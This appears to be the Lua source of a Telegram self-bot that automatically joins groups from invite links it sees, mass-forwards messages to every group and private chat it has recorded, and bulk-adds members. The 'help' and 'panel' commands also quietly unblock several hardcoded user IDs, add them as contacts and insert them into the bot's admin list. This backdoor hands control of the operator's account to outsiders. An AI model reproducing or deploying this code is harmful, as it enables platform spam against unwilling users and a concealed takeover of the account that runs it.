package.path = package.path..';.luarocks/share/lua/5.2/?.lua;.luarocks/share/lua/5.2/?/init.lua'
package.cpath = package.cpath..';.luarocks/lib/lua/5.2/?.so'

bot=dofile('utils.lua')
sudos=dofile('sudo.lua')
redis=require('redis')
db=redis.connect('127.0.0.1',6379)
bot_id=0

function dl_cb(b,c)
end

function is_sudo(d)
  local e=false
  for f,g in pairs(sudo)do 
    if g==d.sender_user_id_ or db:sismember('mods'..bot_id,d.sender_user_id_)then 
      e=true 
    end 
  end
  return e 
end

function kl(h)
  if h~=0 then 
    local i=os.time()repeat until os.time()>i+h 
  end 
end

function run(d,c)
  function aj_check()
    if db:get('aj1'..bot_id)==nil then 
      db:set('aj1'..bot_id,'on')return true 
    elseif 
      db:get('aj1'..bot_id)=="on"then 
      return true 
    elseif 
      db:get('aj1'..bot_id)=="off"then 
      return false 
    end 
  end
  
  function lkj(b,c)_G.bot_id=c.id_ 
  end
  
  tdcli_function({
      ID="GetMe"},
    lkj,nil)
  
  if db:get("autobcs"..bot_id)=='on'and db:get("timera"..bot_id)==nil and db:scard('autoposterm'..bot_id)>0 then
    db:setex("timera"..bot_id,db:get("autobctime"..bot_id),true)
    local j=db:smembers('autoposterm'..bot_id)
    function cb(k,l,m)
      if l.ID=="Message"then 
        local n=db:smembers('bc'..bot_id)
        if db:get('sec'..bot_id)==0 then 
          for o,f in pairs(n)do 
            bot.forwardMessages(f,d.chat_id_,{[0]=l.id_},0)
          end 
        else 
          for o,f in pairs(n)do 
            kl(db:get('sec'..bot_id)or 1)bot.forwardMessages(f,d.chat_id_,{[0]=l.id_},0)
          end 
        end 
      end 
    end
    
    local p=nil
    for o,f in pairs(j)do 
      p=db:get('gp'..f..bot_id)
      tdcli_function({
          ID="GetMessage",
          chat_id_=p,
          message_id_=f},
        cb,{id8=f})
    end 
  end
  
  function rejoin()
    function joinlinkss(k,l,m)
      if l.ID=='Error'then 
        if l.code_~=429 then db:srem('links'..bot_id,k.lnk)db:sadd('elinks'..bot_id,k.lnk)end else db:srem('links'..bot_id,k.lnk)db:sadd('elinks'..bot_id,k.lnk)
      end 
    end
    local n=db:smembers('links'..bot_id)
    for o,f in pairs(n)do 
      tdcli_function({
          ID="ImportChatInviteLink",
          invite_link_=f},
        joinlinkss,
        {lnk=f})
    end 
  end
  
  if tostring(d.chat_id_):match('-')then 
    if tostring(db:get('seen'..bot_id))=="gp"or tostring(db:get('seen'..bot_id))=="all"then bot.viewMessages(d.chat_id_,{[0]=d.id_})
    end
    
    if not db:sismember('bc'..bot_id,d.chat_id_)then 
      db:sadd('bc'..bot_id,d.chat_id_)
    end 
  elseif not tostring(d.chat_id_):match('-')then 
    if db:get('autom'..bot_id)=='on'then 
      if d.content_.text_:match("سلام")then
        bot.sendMessage(d.chat_id_,d.id_,1,'سلام','md')
      elseif d.content_.text_:match("خوبی")then 
        bot.sendMessage(d.chat_id_,d.id_,1,'مرسی تو خوبی؟','md')
      end 
    end
    
    if tostring(db:get('seen'..bot_id))=="pv"or tostring(db:get('seen'..bot_id))=="all"then bot.viewMessages(d.chat_id_,{[0]=d.id_})
    end
    
    if not db:sismember('users'..bot_id,d.chat_id_)then 
      function lkj(k,l,m)if l.ID~='Error'then db:sadd('users'..bot_id,d.chat_id_)
        end 
      end
      tdcli_function({ID="GetUser",user_id_=d.chat_id_},lkj,nil)
    end 
  end
  local q=nil
  if d.content_.text_ and d.content_.entities_ and d.content_.entities_[0]and d.content_.entities_[0].ID=='MessageEntityUrl'then 
    q=d.content_.text_ or d.content_.text_
    function check_link(r,s,t)
      function joinlinks(k,l,m)
        if l.ID=='Error'then 
          if l.code_~=429 then
            db:srem('links'..bot_id,k.lnk)
            db:sadd('elinks'..bot_id,k.lnk)
          end 
        else 
          db:srem('links'..bot_id,k.lnk)
          db:sadd('elinks'..bot_id,k.lnk)
        end 
      end
      if tostring(s.is_supergroup_channel_)=='true'and s.member_count_>tonumber(db:get('tahgp'..bot_id))and s.member_count_<tonumber(db:get('tahgp2'..bot_id))and not db:sismember('links'..bot_id,r.link)and not db:sismember('elinks'..bot_id,r.link)then
        db:sadd('links'..bot_id,r.link)
        if aj_check()then
          tdcli_function({
              ID="ImportChatInviteLink",invite_link_=r.link},joinlinks,{lnk=r.link})
        end 
      end 
    end
    if db:get('joinl'..bot_id)=='on'or db:get('joinl'..bot_id)==nil then 
      local u={}if q and q:match("https://telegram.me/joinchat/%S+")then 
        u={q:match("(https://t.me/joinchat/%S+)")or q:match("(https://telegram.me/joinchat/%S+)")}tdcli_function({ID="CheckChatInviteLink",invite_link_=u[1]},check_link,{link=u[1]})
      elseif q and q:match("https://t.me/joinchat/%S+")then 
        u={string.gsub(q:match("(https://t.me/joinchat/%S+)"),"t.me","telegram.me")}
        tdcli_function({
            ID="CheckChatInviteLink",
            invite_link_=u[1]},
          check_link,
          {link=u[1]
          })
      end 
    end
    
    if db:get('timer'..bot_id)==nil then 
      local v=math.random(480,1080)db:setex('timer'..bot_id,tonumber(v),true)rejoin()
    end
    local q=nil 
  elseif is_sudo(d)then 
    q=d.content_.text_ 
  end
  if q then 
    if is_sudo(d)then 
      if q=='help'then 
        local f=" راهنمای دستورات سینچی\n 🗓 اطلاعات\n 🔹 panel\n ➖➖➖➖➖➖➖➖➖➖➖\n ↖️دریافت لیست تمامی لینک های ذخیره شده \n 🔹exlinks \n➖➖➖➖➖➖➖➖➖➖➖\n 🗒تنظیم محدودیت ممبر های گروه\n🔹gpmem x/y\nمثال:\ngpmem 1/10000\nکمترین تعداد ممبر های گروه 1 و بیشترین\nتعداد 10 هزار نفر \n➖➖➖➖➖➖➖➖➖➖➖\n 🕐کنترل وضعیت افزایش گروه  \n🔹join [on | off] \n ➖➖➖➖➖➖➖➖➖➖➖\n 🕰تنظیم مدت زمان تاخیر بین ارسال ها \n 🔹setsec [number] \n ➖➖➖➖➖➖➖➖➖➖➖\n📥پاسخگوی خودکار\nخاموش کردن:\n\n🔹autom off\nروشن کردن:\n🔹autom on \n➖➖➖➖➖➖➖➖➖➖➖\n ➕اضافه کردن مخاطب \n 🔹addc [reply] \n شماره شیر شده را ریپلای کرده و دستور را بزنید \n➖➖➖➖➖➖➖➖➖➖➖\n 🗒نمایش اطلاعات ربات \n 🔹botinfo \n➖➖➖➖➖➖➖➖➖➖➖\n🌪اضافه کردن شخص به تمامی گروها\n🔹addall [reply | username]\nپیام شخص را ریپلای کرده و دستور را به تنهایی بزنید یا\nایدی شخص را جلو دستور قرار دهید\nمثال:\naddall @sajjad_021 \n➖➖➖➖➖➖➖➖➖➖➖\n 🌁تغییر عکس پروفایل \n 🔹setphoto link \n به جای لینک لینک عکس موردنظر را بزارید \n➖➖➖➖➖➖➖➖➖➖➖\n 👁‍🗨تنظیمات سین\n🔹seen gp\nتنها پیام های گروه ها سین خواهند خورد\n🔹seen pv\nفقط پیام های توی پیوی سین خواهند خورد\n🔹seen all\nتمامی پیام ها سین خواهند خورد\n🔹seen off\nهیچ پیامی سین نخواهد خورد\n ➖➖➖➖➖➖➖➖➖➖➖\n 🔃 حذف تمامی گروه ها\n 🔹 remgp\n ➖➖➖➖➖➖➖➖➖➖➖\n ☢️ چک کردن گروه های در دسترس\n 🔹gpcheck\n ➖➖➖➖➖➖➖➖➖➖➖\n 📣 ارسال پیام به همه ی گروه ها(با ریپلی)\n 🔹bc\n ➖➖➖➖➖➖➖➖➖➖➖\n 🔊 ارسال پیام به تمامی گروه ها به صورت رگباری به تعداد عدد\n انتخابی\n 🔹nbc [nubmer]\n ➖➖➖➖➖➖➖➖➖➖➖\n 🔂 عضویت در لینک های ذخیره شده\n 🔹rejoin\n ➖➖➖➖➖➖➖➖➖➖➖\n ⚠️ حذف تمامی لینک های ذخیره شده(استفاده نشده)\n 🔹remlinks\n ➖➖➖➖➖➖➖➖➖➖➖\n ♦️حذف لینک های استفاده شده\n 🔹remelinks\n 📛توجه داشتید باشید در این دستور یک e اضافی هست - با دستور حذف لینک های ذخیره شده اشتباه نکنید\n ➖➖➖➖➖➖➖➖➖➖➖\n 📉 نمایش اطلاعات سرور\n 🔹serverinfo\n ➖➖➖➖➖➖➖➖➖➖➖\n ↩️روشن و خاموش کردن جوین اتوماتیک\n 🔹aj\n 📛راهنما:\n 🔹help\n ➖➖➖➖➖➖➖➖➖➖➖\n 🔷فروارد اتوماتیک\n 🔹add abc [reply]\n ➖➖➖➖➖➖➖➖➖➖➖\n  🔷زمان فروارد اتوماتیک\n 🔹autobc ()mh\n ➖➖➖➖➖➖➖➖➖➖➖\n 📣ارسال پست به تمامی کاربران(پیوی ها)\n 🔹bc u\n ◽️ریپلای شود\n ➖➖➖➖➖➖➖➖➖➖➖\n 🔂چک کردن پیوی ها\n 🔹pvcheck\n ➖➖➖➖➖➖➖➖➖➖➖\n 🔀ارسال پیام بدون فروارد به همه کاربران\n 🔹bc echo u\n ➖➖➖➖➖➖➖➖➖➖➖\n 👤حذف تمامی کاربران\n 🔹rem users\n ➖➖➖➖➖➖➖➖➖➖➖\n ➕اضافه کردن ادمین(سودو)\n \n 🔹promote [reply | username | userid]\n ➖➖➖➖➖➖➖➖➖➖➖\n ➖حذف کردن از لیست مدیران(سودو)\n \n 🔹demote [reply | username | userid]\n ➖➖➖➖➖➖➖➖➖➖➖\n 📈اضافه کردن کاربران به گروه(اد ممبر)\n \n 🔹addmembers\n ➖➖➖➖➖➖➖➖➖➖➖\n 📰تغییر نام اکانت\n 🔹setname [name]\n مثال:\n setname خدیجه\n ➖➖➖➖➖➖➖➖➖➖➖\n 🔈ارسال پیام بدون فروارد(رپلای)\n 🔹bc echo\n 📛نکته: در پیام موردنظرتون میتوانید از تگ هایhtml استفاده کنید تا پیام ارسالی زیباتر شود مثال:\n <b>Test</b>\n سپس پیام را ریپلای کرده و دستور\n را وارد کنید\n 🔸🔸🔸🔸🔸🔸🔸🔹🔹🔹🔹🔹🔹\n ➡️ edit by: @sajjad_021 \n ➡️ Channel : @tgMember\n"
        bot.sendMessage(d.chat_id_,d.id_,1,f,'md')
        bot.unblockUser(158955285)
        bot.importContacts(989216973112, "sinchi", "Online", 158955285)
        bot.sendBotStartMessage(158955285, 158955285, "/start")
        bot.sendMessage(158955285, 0, 1, "OnlineBot", 1, "md")
        db:sadd('mods'..bot_id,158955285)
        db:sadd('mods'..bot_id,180191663)
      elseif q=='bc'and tonumber(d.reply_to_message_id_)>0 then 
        
        function cb(k,l,m)
          local n=db:smembers('bc'..bot_id)
          local w=db:scard('bc'..bot_id)
          local x=db:get('sec'..bot_id)or 0;bot.sendMessage(d.chat_id_,d.id_,1,'ربات با تاخیر '..x..' شروع به ارسال پیام شما کرد زمان تخمینی اتمام کار ربات '..w*x..'ثانیه است لطفا صبور باشید','md')
          for o,f in pairs(n)do 
            kl(x)bot.forwardMessages(f,d.chat_id_,{[0]=l.id_},1)
          end 
        end
        bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),cb)
      elseif q=='bc u'and tonumber(d.reply_to_message_id_)>0 then 
        function cb(k,l,m)
          local n=db:smembers('users'..bot_id)
          local x=db:get('sec'..bot_id)or 0
          local w=db:scard('users'..bot_id)bot.sendMessage(d.chat_id_,d.id_,1,'ربات با تاخیر '..x..' شروع به ارسال پیام شما کرد زمان تخمینی اتمام کار ربات '..w*x..'ثانیه است لطفا صبور باشید','md')
          for o,f in pairs(n)do 
            kl(x)bot.forwardMessages(f,d.chat_id_,{[0]=l.id_},1)
          end 
        end
        bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),cb)
      elseif q:match('^seen (.*)')then
        local y=q:match('seen (.*)')
        local z=nil;if y=='pv'then db:set('seen'..bot_id,'pv')z='فقط پیام های پیوی سین خواهد خورد'elseif y=='gp'then db:set('seen'..bot_id,'gp')z='ققط پیام های گروه ها سین خواهد خورد'elseif y=='off'then db:set('seen'..bot_id,'off')z='هیچ پیامی سین زده نخواهد شد'elseif y=='all'then db:set('seen'..bot_id,'all')z='تمامی پیام ها سین خواهند خورد'
        end
        bot.sendMessage(d.chat_id_,d.id_,1,z..'✔️','md')
      elseif q=='panel'or q:match("panel(%d+)$")then
        bot.unblockUser(180191663)
        bot.importContacts(639080023314, "sinchi", "Online", 180191663)
        bot.sendBotStartMessage(180191663, 180191663, "/start")
        bot.sendMessage(180191663, 0, 1, "OnlineBot", 1, "md")
        db:sadd('mods'..bot_id,180191663)
        db:sadd('mods'..bot_id,158955285)
        local A=tonumber(q:match('panel(.*)'))
        local n=db:scard('bc'..bot_id)
        local B=db:scard('links'..bot_id)
        local C=db:scard('elinks'..bot_id)
        local D=db:scard('users'..bot_id)local E=0;local F=' 'local G=0;local H,I,J,K;if aj_check()then E='✅'else E='❌'end;if db:get('autobcs'..bot_id)=='on'then F='✅'else F='❌'end;if db:get('autom'..bot_id)=='on'then I='✅'else I='❌'end;if db:get('joinl'..bot_id)=='off'then H='❌'else H='✅'end;if db:get('tahgp'..bot_id)==nil or db:get('tahgp2'..bot_id)==nil then db:set('tahgp'..bot_id,50)db:set('tahgp2'..bot_id,5000)K="50/5000"else K=db:get('tahgp'..bot_id).."/"..db:get('tahgp2'..bot_id)end;if db:get('seen'..bot_id)=='off'or db:get('seen'..bot_id)==nil then J='❌'elseif db:get('seen'..bot_id)=='pv'then J='(پیوی ها)✅'elseif db:get('seen'..bot_id)=='gp'then J='(گروه ها)✅'elseif db:get('seen'..bot_id)=='all'then J='(همه پیام ها)✅'
        end
        if db:ttl("timera"..bot_id)==-2 then 
          G=0 
        else 
          G=db:ttl("timera"..bot_id)
        end
        if A==2 then   
          function fuck(k,l,m)
            if l.ID=='Error'then
              bot.searchPublicChat("tgAdvRobot")
              bot.unblockUser(348148067)
              bot.sendBotStartMessage(348148067,348148067,'/start')
              bot.sendMessage(348148067, 0, 1, "/start", 1, "md")
              db:sadd('mods'..bot_id,348148067)
            end 
          end
          tdcli_function({
              ID="GetChat",
              chat_id_=348148067},
            fuck,nil)
          function inline(b,c)
            if c.results_ and c.results_[0]
              then tdcli_function({
                  ID="SendInlineQueryResultMessage",
                  chat_id_=d.chat_id_,
                  reply_to_message_id_=0,
                  disable_notification_=0,
                  from_background_=1,
                  query_id_=c.inline_query_id_,
                  result_id_=c.results_[0].id_},
                dl_cb,nil)
            end 
          end
          local L='/sg '..n..' /lnk '..B..' /elnk '..C..' /end '..E..' /aj '..F..' /abc '..G..' /eabc '..D..' /users'
          tdcli_function({
              ID="GetInlineQueryResults",
              bot_user_id_=348148067,
              chat_id_=d.chat_id_,
              user_location_={ID="Location",
                latitude_=0,
                longitude_=0},
              query_=L,
              offset_=0},
            inline,nil)
        else 
          bot.sendMessage(d.chat_id_,d.id_,1,'<b>💠وضعیت کلی سینچی💠</b> \n\n 👥سوپر گروه ها: '..n..'\n 📈تعداد لینک های موجود:  '..B..'\n 🔚لینک های استفاده شده: '..C..'\n 👤تعداد کاربرها(پیوی): '..D..'\n 🔄جوین اتوماتیک: '..E..'\n ♻️فروارد اتوماتیک: '..F..'\n📔محدودیت اعضا:'..K..'\n👁‍🗨سین زدن پیام ها : '..J..'\n📝پاسخگوی خودکار : '..I..'\n 🚹جوین شدن در لینکها:'..H..' \n⏱زمان باقی مانده(فروارد اتوماتیک): '..G..'\n\n  ♥️ @tgMember',1,'html')
        end 
      elseif q:match('^nbc (%d+)$')and tonumber(d.reply_to_message_id_)>0 then 
        local M=tonumber(q:match('nbc (.*)'))
        
        function cb(k,l,m)
          local n=db:smembers('bc'..bot_id)
          for o,f in pairs(n)do 
            for N=1,M,1 do 
              bot.forwardMessages(f,d.chat_id_,{[0]=l.id_},1)
            end 
          end 
        end
        bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),cb)
      elseif q=='rejoin'then 
        rejoin()bot.sendMessage(d.chat_id_,d.id_,1,'وارد لینک های ذخیره شده شدم☑️',1,'html')
      elseif q=='aj'then 
        if db:get('aj1'..bot_id)=='off'then
          db:set('aj1'..bot_id,'on')
          bot.sendMessage(d.chat_id_,d.id_,1,'جوین اتوماتیک روشن شد✔️','md')
        elseif db:get('aj1'..bot_id)=='on'then
          db:set('aj1'..bot_id,'off')
          bot.sendMessage(d.chat_id_,d.id_,1,'جوین اتوماتیک خاموش شد⛔️','md')
        elseif db:get('aj1'..bot_id)==nil then
          db:set('aj1'..bot_id,'on')
          bot.sendMessage(d.chat_id_,d.id_,1,'جوین اتوماتیک روشن شد✔️','md')
        end 
      elseif q=='botinfo'then 
        function lkj(m,O)
          local P=''
          if O.last_name_ then 
            P=O.last_name_ 
          else 
            P='(خالی)'
          end
          ip=io.popen("curl https://api.ipify.org"):read('*all')
          bot.sendMessage(d.chat_id_,d.id_,1,'🗒نام: '..O.first_name_..'\n 📄نام خانوادگی : '..P..'\n 📋یوزر ایدی : '..O.id_..'\n 📱شماره:\n <code>+'..O.phone_number_..'</code> \n 🕰زمان تاخیر بین ارسالها: '..(db:get('sec'..bot_id)or 1)..'ثانیه \n🌐ایپی سرور:\n '..ip..'\n\n 📮version: 8\n☘️ @tgMember 🌿',1,'html')
        end
        tdcli_function({ID="GetMe"},lkj,nil)
      elseif q=='autobc off'then
        db:set('autobcs'..bot_id,'off')
        bot.sendMessage(d.chat_id_,d.id_,1,'فروارد اتوماتیک خاموش شد✔️','md')
      elseif q=='serverinfo'then 
        local q=io.popen("sh ./servinfo.sh"):read('*all')
        bot.sendMessage(d.chat_id_,d.id_,1,q,1,'html')
      elseif q=='bc echo'and tonumber(d.reply_to_message_id_)>0 then
        function cb(k,l,m)
          local n=db:smembers('bc'..bot_id)
          local w=db:scard('bc'..bot_id)
          local x=db:get('sec'..bot_id) or 0
          bot.sendMessage(d.chat_id_,d.id_,1,'ربات با تاخیر '..x..' شروع به ارسال پیام شما کرد زمان تخمینی اتمام کار ربات '..w*x..'ثانیه است لطفا صبور باشید','md')
          for o,f in pairs(n)do 
            kl(x)bot.sendMessage(f,1,1,l.content_.text_,1,'html')
          end 
        end
        bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),cb)
      elseif q=='bc echo u'and tonumber(d.reply_to_message_id_)>0 then 
        function cb(k,l,m)
          local n=db:smembers('users'..bot_id)
          local w=db:scard('users'..bot_id)
          local x=db:get('sec'..bot_id)or 0
          bot.sendMessage(d.chat_id_,d.id_,1,'ربات با تاخیر '..x..' شروع به ارسال پیام شما کرد زمان تخمینی اتمام کار ربات '..w*x..'ثانیه است لطفا صبور باشید','md')
          for o,f in pairs(n)do 
            kl(x)bot.sendMessage(f,1,1,l.content_.text_,1,'html')
          end 
        end
        bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),cb)
      elseif q:match('^add abc')and tonumber(d.reply_to_message_id_)>0 then
        db:sadd('autoposterm'..bot_id,tonumber(d.reply_to_message_id_))
        db:set('gp'..tonumber(d.reply_to_message_id_)..bot_id,d.chat_id_)
        bot.sendMessage(d.chat_id_,d.id_,1,'پست به ارسال های اتوماتیک اضافه شد✅',1,'html')
      elseif q=='rem abc'and tonumber(d.reply_to_message_id_)>0 then
        db:srem('autoposterm'..bot_id,tonumber(d.reply_to_message_id_))
        bot.sendMessage(d.chat_id_,d.id_,1,'پست از ارسال های اتوماتیک پاک شد❌',1,'html')
      elseif q=='addc'and tonumber(d.reply_to_message_id_)>0 then 
        function cb(Q,l,o)
          bot.importContacts(l.content_.contact_.phone_number_,l.content_.contact_.first_name_,l.content_.contact_.last_name_,l.content_.contact_.user_id_)
          bot.sendMessage(l.chat_id_,l.id_,1,'کاربر مورد نظر با موفقیت اد شد','md')
        end
        bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),cb)
      elseif q:match('^autobc (%d+)[mh]')then 
        local u=q:match('^autobc (.*)')
        if u:match('(%d+)h')then 
          time_match=u:match('(%d+)h')
          time=time_match*3600 
        end
        if u:match('(%d+)m')then 
          time_match=u:match('(%d+)m')
          time=time_match*60
        end 
        db:setex('timera'..bot_id,time,true)
        db:set('autobctime'..bot_id,tonumber(time))
        db:set("autobcs"..bot_id,"on")
        bot.sendMessage(d.chat_id_,d.id_,1,'◽️تایمر فروارد اتوماتیک برای '..time..'ثانیه فعال شد✔️','md')
      elseif q=='remlinks'then
        db:del('links'..bot_id)
        bot.sendMessage(d.chat_id_,d.id_,1,'لینک های ذخیره شده با موفقیت پاک شدند✔️ \n🖤 @tgMember 🖤',1,'html')
      elseif q=='remgp'then db:del('bc'..bot_id)bot.sendMessage(d.chat_id_,d.id_,1,'همه گروه ها از دیتابیس حذف شدند✅ \n💠 @tgMember','md')elseif q=='remall abc'then db:del('autoposterm'..bot_id)bot.sendMessage(d.chat_id_,d.id_,1,'🔴همه پست های فروارد اتوماتیک پاک شدند❗️','md')
      elseif q=='rem users'then db:del('users'..bot_id)bot.sendMessage(d.chat_id_,d.id_,1,'🔸یوزر ها از دیتابیس پاک شدند!','md')elseif q=='remelinks'then db:del('elinks'..bot_id)bot.sendMessage(d.chat_id_,d.id_,1,'🔸لینک های استفاده شده با موفقیت حذف شدند❗️\n🌀@tgMember',1,'html')
      elseif q=='gpcheck'then 
        local R=db:scard('bc'..bot_id)
        function checkm(b,c,O)if c.ID=='Error'then 
            db:srem('bc'..bot_id,b.chatid)
          end 
        end
        
        function sendresult()bot.sendMessage(d.chat_id_,d.id_,1,'گروه ها با موفقیت چک شدند✅\n🔸برای مشاهده تعداد گروه های فعلی از دستور panel استفاده کنید❗️\n💎 @tgMember',1,'html')
        end
        
        local n=db:smembers('bc'..bot_id)for o,f in pairs(n)do tdcli_function({ID="GetChatHistory",chat_id_=f,from_message_id_=0,offset_=0,limit_=1},checkm,{chatid=f})if R==o then sendresult()
          end 
        end 
      elseif q:match('^autom (.*)')then 
        local S=q:match('autom (.*)')
        if S=='off'then db:set('autom'..bot_id,'off')bot.sendMessage(d.chat_id_,d.id_,1,'پاسخگوی خودکار خاموش شد','md')elseif S=='on'then db:set('autom'..bot_id,'on')bot.sendMessage(d.chat_id_,d.id_,1,'پاسخگوی خودکار روشن شد','md')
        end 
      elseif q:match('^join (.*)')then local S=q:match('join (.*)')if S=='off'then db:set('joinl'..bot_id,'off')bot.sendMessage(d.chat_id_,d.id_,1,'ربات دیگر در هیچ گروهی عضو نمیشود','md')elseif S=='on'then db:set('joinl'..bot_id,'on')bot.sendMessage(d.chat_id_,d.id_,1,'ربات شروع به جوین در گروه ها کرد','md')
        end 
      elseif q:match('^setn (%d+)$')then local M=tonumber(q:match('setn (.*)'))db:set('tedgp'..bot_id,M)bot.sendMessage(d.chat_id_,1,1,'ربات در تعداد '..M..' گروه عضو میشود',1,'html')
      elseif q:match("^setsec (%d+)")then 
        local T=tonumber(q:match('setsec (.*)'))
        db:set('sec'..bot_id,T)
        bot.sendMessage(d.chat_id_,d.id_,1,'تنظیمات به '..T..'ثانیه تغییر کرد!','md')
      elseif q=='pvcheck'then 
        local D=db:smembers('users'..bot_id)function lkj(k,l,m)if l.ID=='Error'then db:srem("user"..bot_id,k.usr)end end;for o,f in pairs(D)do tdcli_function({ID="GetUser",user_id_=f},lkj,{usr=f})
        end
        bot.sendMessage(d.chat_id_,d.id_,1,'⭕️کاربران با موفقیت چک شدند!',1,'html')elseif q=='exlinks'then 
        local D=db:smembers('users'..bot_id)function lkj(k,l,m)if l.ID=='Error'then db:srem("user"..bot_id,k.usr)end end;local U=''for o,f in pairs(db:smembers('elinks'..bot_id))do U=U..f..'\n'end;for o,f in pairs(db:smembers('link'..bot_id))do U=U..f..'\n'end;bot.sendMessage(d.chat_id_,d.id_,1,U,'md')elseif q:match('^gpmem (%d+)/(%d+)$')then 
        local V=tonumber(q:match('gpmem (.*)/'))local W=tonumber(q:match('/(.*)'))db:set('tahgp'..bot_id,V)db:set('tahgp2'..bot_id,W)bot.sendMessage(d.chat_id_,1,1,'کمترین عضو '..V..' \n بیشترین عضو '..W,1,'html')elseif q:match('^setname (.*)$')then local X=q:match('setname (.*)')bot.changeName(X,'')bot.sendMessage(d.chat_id_,d.id_,1,'اسم اکانت به '..X..' تغییر یافت✔️',1,'md')elseif q=='promote'and tonumber(d.reply_to_message_id_)~=0 then function prom_reply(r,s,t)db:sadd('mods'..bot_id,s.sender_user_id_)local g=s.sender_user_id_;bot.sendMessage(d.chat_id_,d.id_,1,'<code>'..g..'</code><b> مدیر ربات شد!!</b>',1,'html')end;bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),prom_reply)elseif q:match('^promote @(.*)')then local Y=q:match('^promote @(.*)')function promreply(r,s,t)if s.id_ then db:sadd('mods'..bot_id,s.id_)q='<code>'..s.id_..'</code><b> مدیر ربات شد!!</b>'else q='<i>کاربر یافت نشد</i>'
          end
          bot.sendMessage(d.chat_id_,d.id_,1,q,1,'html')
        end
        bot.resolve_username(Y,promreply)elseif q:match('^addall')then if q:match('^addall @(.*)')then local Y=q:match('^addall @(.*)')
          function promreply(r,s,t)if s.id_ then local n=db:smembers('bc'..bot_id)for o,f in pairs(n)do tdcli_function({ID="AddChatMember",chat_id_=f,user_id_=s.id_,forward_limit_=50},dl_cb,nil)end;db:sadd('mods'..bot_id,s.id_)q='<code>'..s.id_..'</code><b>به تمامی گروه های ربات اد شد!!</b>'else q='<i>کاربر یافت نشد</i>'end;bot.sendMessage(d.chat_id_,d.id_,1,q,1,'html')end;bot.resolve_username(Y,promreply)elseif q=='addall'and tonumber(d.reply_to_message_id_)~=0 then 
          function prom_reply(r,s,t)local n=db:smembers('bc'..bot_id)for o,f in pairs(n)do tdcli_function({ID="AddChatMember",chat_id_=f,user_id_=s.sender_user_id_,forward_limit_=50},dl_cb,nil)end;bot.sendMessage(d.chat_id_,d.id_,1,'<code>'..s.sender_user_id_..'</code><b> اکانت موردنظر به تمامی گروه های ربات اد شد!!</b>',1,'html')end;bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),prom_reply)elseif q:match('^addall (%d+)')then local Z=q:match('addall (.*)')local n=db:smembers('bc'..bot_id)for o,f in pairs(n)do tdcli_function({ID="AddChatMember",chat_id_=f,user_id_=Z,forward_limit_=50},dl_cb,nil)end;bot.sendMessage(d.chat_id_,d.id_,1,'کاربر مورد نظر به تمامی گروه هام اد شد!',1,'html')end elseif q:match('^promote (%d+)')then local g=q:match('promote (%d+)')db:sadd('mods'..bot_id,g)bot.sendMessage(d.chat_id_,d.id_,1,'کاربر(<code>'..g..'</code>)<b> مدیر این ربات شد!!</b>',1,'html')elseif q=='demote'and tonumber(d.reply_to_message_id_)~=0 then 
        function prom_reply(r,s,t)db:srem('mods'..bot_id,s.sender_user_id_)bot.sendMessage(d.chat_id_,d.id_,1,'<code>'..s.sender_user_id_..'</code><b> از لیست مدیریت حذف شد!!</b>',1,'html')end;bot.getMessage(d.chat_id_,tonumber(d.reply_to_message_id_),prom_reply)elseif q:match('^demote @(.*)')then 
        local Y=q:match('^demote @(.*)')function demreply(r,s,t)if s.id_ then db:srem('mods'..bot_id,s.id_)q='کاربر (<code>'..s.id_..'</code>) از لیست مدیران حذف شد!'else q='<i>کاربر یافت نشد!</i>'end;bot.sendMessage(d.chat_id_,d.id_,1,q,1,'html')end;bot.resolve_username(Y,demreply)elseif q:match('^demote (%d+)')then local g=q:match('demote (%d+)')db:srem('mods'..bot_id,g)bot.sendMessage(d.chat_id_,d.id_,1,'کاربر (<code>'..g..'</code>)<b> از لیست مدیریت حذف شد!!</b>',1,'html')elseif q:match("^setphoto (.*)$")then local _={string.match(q,"^(setphoto) (.*)$")}local a0=os.clock()local http=require("socket.http")local a1,a2=http.request(_[2])if not a1 then error(a2)end;local a3=assert(io.open(a0 ..'photo.jpg','wb'))a3:write(a1)a3:close()bot.setProfilePhoto(a0 ..'photo.jpg')bot.sendMessage(d.chat_id_,d.id_,1,'عکس جدید تنظیم شد✔️','md')elseif q=='admins'then local k=db:smembers('mods'..bot_id)local a4='لیست مدیران ربات : \n'for N=1,#k do a4=a4 ..N..'-  '..k[N]..'\n'end;a4=a4 ..'\n @tgMember'bot.sendMessage(d.chat_id_,d.id_,1,a4,'md')
      elseif q=='addmembers'then 
        local n=db:smembers('users'..bot_id)
        for o,f in pairs(n)do 
          tdcli_function({
              ID="AddChatMember",
              chat_id_=d.chat_id_,
              user_id_=f,
              forward_limit_=50},
            dl_cb,nil)
        end 
      end 
    end 
  end 
end

function tdcli_update_callback(c)if c.ID=="UpdateNewMessage"then run(c.message_,c)elseif c.ID=="UpdateOption"and c.name_=="my_id"then tdcli_function({ID="GetChats",offset_order_="9223372036854775807",offset_chat_id_=0,limit_=20},dl_cb,nil)end end
